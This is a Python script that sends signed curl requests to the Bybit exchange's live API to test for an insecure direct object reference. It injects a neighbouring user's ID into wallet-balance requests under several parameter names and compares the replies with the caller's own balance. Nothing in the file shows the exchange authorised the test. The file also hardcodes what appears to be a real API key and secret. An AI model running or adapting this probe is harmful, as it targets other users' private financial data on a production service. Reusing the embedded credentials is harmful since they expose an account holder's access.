#!/usr/bin/env python3
import subprocess
import time
import hmac
import hashlib
import json

# Configuration
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"
MY_UID = "527465456"

def get_server_time():
    try:
        cmd = ["curl", "-s", f"{BASE_URL}/v5/market/time"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        data = json.loads(result.stdout)
        return int(data['time'])
    except:
        return int(time.time() * 1000)

OFFSET = get_server_time() - int(time.time() * 1000)

def get_signature(payload, api_secret):
    return hmac.new(
        bytes(api_secret, "utf-8"), 
        bytes(payload, "utf-8"), 
        hashlib.sha256
    ).hexdigest()

def send_request(method, endpoint, payload=None):
    if payload is None:
        payload = {}
        
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "5000"
    
    params_str = "&".join([f"{k}={v}" for k, v in sorted(payload.items())])
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
    full_url = f"{BASE_URL}{endpoint}?{params_str}"
    
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = [
        "-H", f"X-BAPI-API-KEY: {API_KEY}",
        "-H", f"X-BAPI-SIGN: {signature}",
        "-H", "X-BAPI-SIGN-TYPE: 2",
        "-H", f"X-BAPI-TIMESTAMP: {timestamp}",
        "-H", f"X-BAPI-RECV-WINDOW: {recv_window}",
        "-H", "Content-Type: application/json"
    ]
    
    cmd = ["curl", "-s"] + headers + [full_url]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        return json.loads(result.stdout)
    except:
        return {}

print("="*80)
print("IDOR VERIFICATION (DIFF CHECK)")
print("="*80)

# 1. Get Baseline
print("\n[1] Getting Baseline Data...")
baseline_res = send_request("GET", "/v5/account/wallet-balance", {"accountType": "UNIFIED"})
if baseline_res.get('retCode') != 0:
    print("Failed to get baseline.")
    exit()

# Remove timestamps/ids that change every request to make comparison stable
def clean_data(data):
    s = json.dumps(data, sort_keys=True)
    # Remove time fields if any (though wallet balance usually stableish)
    return s

baseline_str = clean_data(baseline_res.get('result'))
print("  Baseline captured.")

# 2. Test with Injection
target = "527465455" # Neighbor
params_to_test = ["uid", "memberId", "userId", "subMemberId"]

found_diff = False

for param in params_to_test:
    print(f"\nTesting param: {param}={target}")
    
    payload = {"accountType": "UNIFIED"}
    payload[param] = target
    
    res = send_request("GET", "/v5/account/wallet-balance", payload)
    
    if res.get('retCode') == 0:
        target_str = clean_data(res.get('result'))
        
        if target_str == baseline_str:
            print("  RESULT: Identical (Parameter Ignored) - Safe")
        else:
            print("  🚨 RESULT: DIFFERENT DATA! (Potential IDOR)")
            print(f"  Baseline len: {len(baseline_str)}")
            print(f"  Target len:   {len(target_str)}")
            found_diff = True
    else:
        print(f"  RESULT: Error {res.get('retCode')} (Safe)")

if not found_diff:
    print("\n✅ CONCLUSION: All tested parameters were ignored. No IDOR found on this endpoint.")
else:
    print("\n🚨 CONCLUSION: Possible IDOR found! Investigate the 'DIFFERENT DATA' cases.")

print("="*80)
